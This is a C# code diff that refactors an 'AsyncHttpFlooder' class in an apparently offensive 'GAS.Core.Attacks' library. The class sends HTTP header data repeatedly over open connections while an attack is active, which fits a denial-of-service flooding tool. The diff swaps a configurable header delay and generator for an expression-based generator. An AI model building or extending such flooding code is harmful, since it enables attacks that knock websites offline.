@@ -1,13 +1,10 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using GAS.Core.AttackInformation;
 
 namespace GAS.Core.Attacks {
     public class AsyncHttpFlooder : AsyncHttpFlooderCore {
-        private int _headersDelay;
-
         public IHttpAttackInfo HttpAttackInfo {
             get {
                 return this.AttackInfo as IHttpAttackInfo;
@@ -17,24 +14,9 @@ namespace GAS.Core.Attacks {
             }
         }
 
-        public AsyncHttpFlooder():base() {
+        public AsyncHttpFlooder() {
             this.SendHeaders = this.SendHeadersI;
             this.WrapStream = this.WrapStreamI;
-        }
-        /// <summary>
-        /// HeaderGenerator
-        /// </summary>
-        public Func<byte[], object, int> HeaderGenerator { get; set; }
-        /// <summary>
-        /// Delay between sent headers packets
-        /// </summary>
-        public int HeadersDelay {
-            get { return this._headersDelay; }
-            set {
-                if ( this.Active )
-                    throw new InvalidOperationException( "HeadersDelay setting is not allowed while attacking" );
-                this._headersDelay = value;
-            }
         }
         #region AsyncHttpFlooder
         /// <summary>
@@ -51,12 +33,12 @@ namespace GAS.Core.Attacks {
             NetworkStream basestream,
             object token ) {
             return await AsyncFlooderImplementations.SendData(
-                stream: stream,
-                generator: this.HeaderGenerator,
-                cancellationToken: () => this.Active,
-                generatorToken: token,
-                delay: this.HeadersDelay,
-                bufferSize: 256
+                stream,
+                (a,b)=>AsyncFlooderImplementations.Generate(a,this.HttpAttackInfo.HeaderExpression),
+                token,
+                256,
+                null,
+                () => this.Active
             );
         }
         /// <summary>
